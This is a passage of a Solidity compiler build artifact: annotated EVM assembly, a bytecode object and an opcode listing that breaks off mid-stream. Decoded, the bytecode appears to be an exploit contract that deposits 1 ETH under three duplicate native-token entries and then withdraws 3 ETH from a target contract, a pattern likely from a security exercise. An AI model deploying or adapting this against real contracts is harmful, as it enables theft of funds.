*/\n      dup1\n        /* \"#utility.yul\":3252:3253   */\n      0x00\n        /* \"#utility.yul\":3237:3521   */\n    tag_112:\n        /* \"#utility.yul\":3262:3268   */\n      dup4\n        /* \"#utility.yul\":3259:3260   */\n      dup2\n        /* \"#utility.yul\":3256:3269   */\n      lt\n        /* \"#utility.yul\":3237:3521   */\n      iszero\n      tag_114\n      jumpi\n        /* \"#utility.yul\":3338:3344   */\n      dup2\n        /* \"#utility.yul\":3332:3345   */\n      mload\n        /* \"#utility.yul\":3365:3428   */\n      tag_115\n        /* \"#utility.yul\":3424:3427   */\n      dup9\n        /* \"#utility.yul\":3409:3422   */\n      dup3\n        /* \"#utility.yul\":3365:3428   */\n      tag_63\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":3358:3428   */\n      swap8\n      pop\n        /* \"#utility.yul\":3451:3511   */\n      tag_116\n        /* \"#utility.yul\":3504:3510   */\n      dup4\n        /* \"#utility.yul\":3451:3511   */\n      tag_64\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":3441:3511   */\n      swap3\n      pop\n        /* \"#utility.yul\":3297:3521   */\n      pop\n        /* \"#utility.yul\":3284:3285   */\n      0x01\n        /* \"#utility.yul\":3281:3282   */\n      dup2\n        /* \"#utility.yul\":3277:3286   */\n      add\n        /* \"#utility.yul\":3272:3286   */\n      swap1\n      pop\n        /* \"#utility.yul\":3237:3521   */\n      jump(tag_112)\n    tag_114:\n        /* \"#utility.yul\":3241:3255   */\n      pop\n        /* \"#utility.yul\":3537:3540   */\n      dup6\n        /* \"#utility.yul\":3530:3540   */\n      swap4\n      pop\n        /* \"#utility.yul\":2938:3546   */\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":2814:3546   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3552:3666   */\n    tag_66:\n        /* \"#utility.yul\":3619:3625   */\n      0x00\n        /* \"#utility.yul\":3653:3658   */\n      dup2\n        /* \"#utility.yul\":3647:3659   */\n      mload\n        /* \"#utility.yul\":3637:3659   */\n      swap1\n      pop\n        /* \"#utility.yul\":3552:3666   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3672:3856   */\n    tag_67:\n        /* \"#utility.yul\":3771:3782   */\n      0x00\n        /* \"#utility.yul\":3805:3811   */\n      dup3\n        /* \"#utility.yul\":3800:3803   */\n      dup3\n        /* \"#utility.yul\":3793:3812   */\n      mstore\n        /* \"#utility.yul\":3845:3849   */\n      0x20\n        /* \"#utility.yul\":3840:3843   */\n      dup3\n        /* \"#utility.yul\":3836:3850   */\n      add\n        /* \"#utility.yul\":3821:3850   */\n      swap1\n      pop\n        /* \"#utility.yul\":3672:3856   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3862:3994   */\n    tag_68:\n        /* \"#utility.yul\":3929:3933   */\n      0x00\n        /* \"#utility.yul\":3952:3955   */\n      dup2\n        /* \"#utility.yul\":3944:3955   */\n      swap1\n      pop\n        /* \"#utility.yul\":3982:3986   */\n      0x20\n        /* \"#utility.yul\":3977:3980   */\n      dup3\n        /* \"#utility.yul\":3973:3987   */\n      add\n        /* \"#utility.yul\":3965:3987   */\n      swap1\n      pop\n        /* \"#utility.yul\":3862:3994   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4000:4077   */\n    tag_69:\n        /* \"#utility.yul\":4037:4044   */\n      0x00\n        /* \"#utility.yul\":4066:4071   */\n      dup2\n        /* \"#utility.yul\":4055:4071   */\n      swap1\n      pop\n        /* \"#utility.yul\":4000:4077   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4083:4191   */\n    tag_70:\n        /* \"#utility.yul\":4160:4184   */\n      tag_122\n        /* \"#utility.yul\":4178:4183   */\n      dup2\n        /* \"#utility.yul\":4160:4184   */\n      tag_69\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":4155:4158   */\n      dup3\n        /* \"#utility.yul\":4148:4185   */\n      mstore\n        /* \"#utility.yul\":4083:4191   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4197:4376   */\n    tag_71:\n        /* \"#utility.yul\":4266:4276   */\n      0x00\n        /* \"#utility.yul\":4287:4333   */\n      tag_124\n        /* \"#utility.yul\":4329:4332   */\n      dup4\n        /* \"#utility.yul\":4321:4327   */\n      dup4\n        /* \"#utility.yul\":4287:4333   */\n      tag_70\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":4365:4369   */\n      0x20\n        /* \"#utility.yul\":4360:4363   */\n      dup4\n        /* \"#utility.yul\":4356:4370   */\n      add\n        /* \"#utility.yul\":4342:4370   */\n      swap1\n      pop\n        /* \"#utility.yul\":4197:4376   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4382:4495   */\n    tag_72:\n        /* \"#utility.yul\":4452:4456   */\n      0x00\n        /* \"#utility.yul\":4484:4488   */\n      0x20\n        /* \"#utility.yul\":4479:4482   */\n      dup3\n        /* \"#utility.yul\":4475:4489   */\n      add\n        /* \"#utility.yul\":4467:4489   */\n      swap1\n      pop\n        /* \"#utility.yul\":4382:4495   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4531:5263   */\n    tag_73:\n        /* \"#utility.yul\":4650:4653   */\n      0x00\n        /* \"#utility.yul\":4679:4733   */\n      tag_127\n        /* \"#utility.yul\":4727:4732   */\n      dup3\n        /* \"#utility.yul\":4679:4733   */\n      tag_66\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":4749:4835   */\n      tag_128\n        /* \"#utility.yul\":4828:4834   */\n      dup2\n        /* \"#utility.yul\":4823:4826   */\n      dup6\n        /* \"#utility.yul\":4749:4835   */\n      tag_67\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":4742:4835   */\n      swap4\n      pop\n        /* \"#utility.yul\":4859:4915   */\n      tag_129\n        /* \"#utility.yul\":4909:4914   */\n      dup4\n        /* \"#utility.yul\":4859:4915   */\n      tag_68\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":4938:4945   */\n      dup1\n        /* \"#utility.yul\":4969:4970   */\n      0x00\n        /* \"#utility.yul\":4954:5238   */\n    tag_130:\n        /* \"#utility.yul\":4979:4985   */\n      dup4\n        /* \"#utility.yul\":4976:4977   */\n      dup2\n        /* \"#utility.yul\":4973:4986   */\n      lt\n        /* \"#utility.yul\":4954:5238   */\n      iszero\n      tag_132\n      jumpi\n        /* \"#utility.yul\":5055:5061   */\n      dup2\n        /* \"#utility.yul\":5049:5062   */\n      mload\n        /* \"#utility.yul\":5082:5145   */\n      tag_133\n        /* \"#utility.yul\":5141:5144   */\n      dup9\n        /* \"#utility.yul\":5126:5139   */\n      dup3\n        /* \"#utility.yul\":5082:5145   */\n      tag_71\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":5075:5145   */\n      swap8\n      pop\n        /* \"#utility.yul\":5168:5228   */\n      tag_134\n        /* \"#utility.yul\":5221:5227   */\n      dup4\n        /* \"#utility.yul\":5168:5228   */\n      tag_72\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":5158:5228   */\n      swap3\n      pop\n        /* \"#utility.yul\":5014:5238   */\n      pop\n        /* \"#utility.yul\":5001:5002   */\n      0x01\n        /* \"#utility.yul\":4998:4999   */\n      dup2\n        /* \"#utility.yul\":4994:5003   */\n      add\n        /* \"#utility.yul\":4989:5003   */\n      swap1\n      pop\n        /* \"#utility.yul\":4954:5238   */\n      jump(tag_130)\n    tag_132:\n        /* \"#utility.yul\":4958:4972   */\n      pop\n        /* \"#utility.yul\":5254:5257   */\n      dup6\n        /* \"#utility.yul\":5247:5257   */\n      swap4\n      pop\n        /* \"#utility.yul\":4655:5263   */\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":4531:5263   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5269:5903   */\n    tag_42:\n        /* \"#utility.yul\":5490:5494   */\n      0x00\n        /* \"#utility.yul\":5528:5530   */\n      0x40\n        /* \"#utility.yul\":5517:5526   */\n      dup3\n        /* \"#utility.yul\":5513:5531   */\n      add\n        /* \"#utility.yul\":5505:5531   */\n      swap1\n      pop\n        /* \"#utility.yul\":5577:5586   */\n      dup2\n        /* \"#utility.yul\":5571:5575   */\n      dup2\n        /* \"#utility.yul\":5567:5587   */\n      sub\n        /* \"#utility.yul\":5563:5564   */\n      0x00\n        /* \"#utility.yul\":5552:5561   */\n      dup4\n        /* \"#utility.yul\":5548:5565   */\n      add\n        /* \"#utility.yul\":5541:5588   */\n      mstore\n        /* \"#utility.yul\":5605:5713   */\n      tag_136\n        /* \"#utility.yul\":5708:5712   */\n      dup2\n        /* \"#utility.yul\":5699:5705   */\n      dup6\n        /* \"#utility.yul\":5605:5713   */\n      tag_65\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":5597:5713   */\n      swap1\n      pop\n        /* \"#utility.yul\":5760:5769   */\n      dup2\n        /* \"#utility.yul\":5754:5758   */\n      dup2\n        /* \"#utility.yul\":5750:5770   */\n      sub\n        /* \"#utility.yul\":5745:5747   */\n      0x20\n        /* \"#utility.yul\":5734:5743   */\n      dup4\n        /* \"#utility.yul\":5730:5748   */\n      add\n        /* \"#utility.yul\":5723:5771   */\n      mstore\n        /* \"#utility.yul\":5788:5896   */\n      tag_137\n        /* \"#utility.yul\":5891:5895   */\n      dup2\n        /* \"#utility.yul\":5882:5888   */\n      dup5\n        /* \"#utility.yul\":5788:5896   */\n      tag_73\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":5780:5896   */\n      swap1\n      pop\n        /* \"#utility.yul\":5269:5903   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5909:6012   */\n    tag_74:\n        /* \"#utility.yul\":5972:5979   */\n      0x00\n        /* \"#utility.yul\":6001:6006   */\n      dup2\n        /* \"#utility.yul\":5990:6006   */\n      swap1\n      pop\n        /* \"#utility.yul\":5909:6012   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6018:6212   */\n    tag_75:\n        /* \"#utility.yul\":6094:6103   */\n      0x00\n        /* \"#utility.yul\":6127:6206   */\n      tag_140\n        /* \"#utility.yul\":6145:6205   */\n      tag_141\n        /* \"#utility.yul\":6154:6204   */\n      tag_142\n        /* \"#utility.yul\":6198:6203   */\n      dup5\n        /* \"#utility.yul\":6154:6204   */\n      tag_74\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":6145:6205   */\n      tag_52\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":6127:6206   */\n      tag_69\n      jump\t// in\n    tag_140:\n        /* \"#utility.yul\":6114:6206   */\n      swap1\n      pop\n        /* \"#utility.yul\":6018:6212   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6218:6401   */\n    tag_76:\n        /* \"#utility.yul\":6331:6394   */\n      tag_144\n        /* \"#utility.yul\":6388:6393   */\n      dup2\n        /* \"#utility.yul\":6331:6394   */\n      tag_75\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":6326:6329   */\n      dup3\n        /* \"#utility.yul\":6319:6395   */\n      mstore\n        /* \"#utility.yul\":6218:6401   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6407:6791   */\n    tag_47:\n        /* \"#utility.yul\":6554:6558   */\n      0x00\n        /* \"#utility.yul\":6592:6594   */\n      0x40\n        /* \"#utility.yul\":6581:6590   */\n      dup3\n        /* \"#utility.yul\":6577:6595   */\n      add\n        /* \"#utility.yul\":6569:6595   */\n      swap1\n      pop\n        /* \"#utility.yul\":6605:6676   */\n      tag_146\n        /* \"#utility.yul\":6673:6674   */\n      0x00\n        /* \"#utility.yul\":6662:6671   */\n      dup4\n        /* \"#utility.yul\":6658:6675   */\n      add\n        /* \"#utility.yul\":6649:6655   */\n      dup6\n        /* \"#utility.yul\":6605:6676   */\n      tag_58\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":6686:6784   */\n      tag_147\n        /* \"#utility.yul\":6780:6782   */\n      0x20\n        /* \"#utility.yul\":6769:6778   */\n      dup4\n        /* \"#utility.yul\":6765:6783   */\n      add\n        /* \"#utility.yul\":6756:6762   */\n      dup5\n        /* \"#utility.yul\":6686:6784   */\n      tag_76\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":6407:6791   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206f4e9651408f80cd4fc7a7f7d939e99e03b512f5878ae27055b63285a6c492e664736f6c63430008160033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506040516108c33803806108c3833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6107b78061010c5f395ff3fe608060405260043610610037575f3560e01c806376cdb03b146100425780638322fff21461006c578063dd365b8b146100965761003e565b3661003e57005b5f80fd5b34801561004d575f80fd5b506100566100a0565b60405161006391906104c9565b60405180910390f35b348015610077575f80fd5b506100806100c3565b60405161008d9190610502565b60405180910390f35b61009e6100db565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b5f600367ffffffffffffffff8111156100f7576100f661051b565b5b6040519080825280602002602001820160405280156101255781602001602082028036833780820191505090505b50905073eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee815f815181106101505761014f610548565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505073eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee816001815181106101b3576101b2610548565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505073eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee8160028151811061021657610215610548565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250505f600367ffffffffffffffff81111561026c5761026b61051b565b5b60405190808252806020026020018201604052801561029a5781602001602082028036833780820191505090505b509050670de0b6b3a7640000815f815181106102b9576102b8610548565b5b602002602001018181525050670de0b6b3a7640000816001815181106102e2576102e1610548565b5b602002602001018181525050670de0b6b3a76400008160028151811061030b5761030a610548565b5b6020026020010181815250505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663638c079a670de0b6b3a764000084846040518463ffffffff1660e01b815260040161037a9291906106ec565b5f604051808303818588803b158015610391575f80fd5b505af11580156103a3573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f3fef3a373eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6729a2241af62c00006040518363ffffffff1660e01b815260040161041e92919061075a565b5f604051808303815f87803b158015610435575f80fd5b505af1158015610447573d5f803e3d5ffd5b505050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61049161048c6104878461044f565b61046e565b61044f565b9050919050565b5f6104a282610477565b9050919050565b5f6104b382610498565b9050919050565b6104c3816104a9565b82525050565b5f6020820190506104dc5f8301846104ba565b92915050565b5f6104ec8261044f565b9050919050565b6104fc816104e2565b82525050565b5f6020820190506105155f8301846104f3565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b6105a7816104e2565b82525050565b5f6105b8838361059e565b60208301905092915050565b5f602082019050919050565b5f6105da82610575565b6105e4818561057f565b93506105ef8361058f565b805f5b8381101561061f57815161060688826105ad565b9750610611836105c4565b9250506001810190506105f2565b5085935050505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f819050919050565b61066781610655565b82525050565b5f610678838361065e565b60208301905092915050565b5f602082019050919050565b5f61069a8261062c565b6106a48185610636565b93506106af83610646565b805f5b838110156106df5781516106c6888261066d565b97506106d183610684565b9250506001810190506106b2565b5085935050505092915050565b5f6040820190508181035f83015261070481856105d0565b905081810360208301526107188184610690565b90509392505050565b5f819050919050565b5f61074461073f61073a84610721565b61046e565b610655565b9050919050565b6107548161072a565b82525050565b5f60408201905061076d5f8301856104f3565b61077a602083018461074b565b939250505056fea26469706673582212206f4e9651408f80cd4fc7a7f7d939e99e03b512f5878ae27055b63285a6c492e664736f6c63430008160033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x8C3 CODESIZE SUB DUP1 PUSH2 0x8C3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x7B7 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x8322FFF2 EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x96 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x56 PUSH2 0xA0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x4C9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x77 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x80 PUSH2 0xC3 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8D SWAP2 SWAP1 PUSH2 0x502 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9E PUSH2 0xDB JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH20 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE DUP2 JUMP JUMPDEST PUSH0 PUSH1 0x3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xF7 JUMPI PUSH2 0xF6 PUSH2 0x51B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x125 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH20 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE DUP2 PUSH0 DUP2 MLOAD DUP2 LT PUSH2 0x150 JUMPI PUSH2 0x14F PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH20 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x1B3 JUMPI PUSH2 0x1B2 PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH20 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE DUP2 PUSH1 0x2 DUP2 MLOAD DUP2 LT PUSH2 0x216 JUMPI PUSH2 0x215 PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH0 PUSH1 0x3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x26C JUMPI PUSH2 0x26B PUSH2 0x51B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x29A JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH8 0xDE0B6B3A7640000 DUP2 PUSH0 DUP2 MLOAD DUP2 LT PUSH2 0x2B9 JUMPI PUSH2 0x2B8 PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH8 0xDE0B6B3A7640000 DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x2E2 JUMPI PUSH2 0x2E1 PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH8 0xDE0B6B3A7640000 DUP2 PUSH1 0x2 DUP2 MLOAD DUP2 LT PUSH2 0x30B JUMPI PUSH2 0x30A PUSH2 0x548 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x638C079A PUSH8 0xDE0B6B3A7640000 DUP5 DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x37A SWAP3 SWAP2 SWAP1 PUSH2 0x6EC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x391 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3A3 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF3FEF3A3 PUSH20 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE PUSH8 0x29A2241AF62C0000 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x41E SWAP3 SWAP2 SWAP1 PUSH2 0x75A JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x435 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x447 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x491 PUSH2 0x48C PUSH2 0x487 DUP5 PUSH2 0x44F JUMP JUMPDEST PUSH2 0x46E JUMP JUMPDEST PUSH2 0x44F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4A2 DUP3 PUSH2 0x477 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4B3 DUP3 PUSH2 0x498 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4C3 DUP2 PUSH2 0x4A9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4DC PUSH0 DUP4 ADD DUP5 PUSH2 0x4BA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x4EC DUP3 PUSH2 0x44F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4FC DUP2 PUSH2 0x4E2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x515 PUSH0 DUP4 ADD DUP5 PUSH2 0x4F3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5A7 DUP2 PUSH2 0x4E2 JUMP JUMPDEST DUP3 MSTORE POP 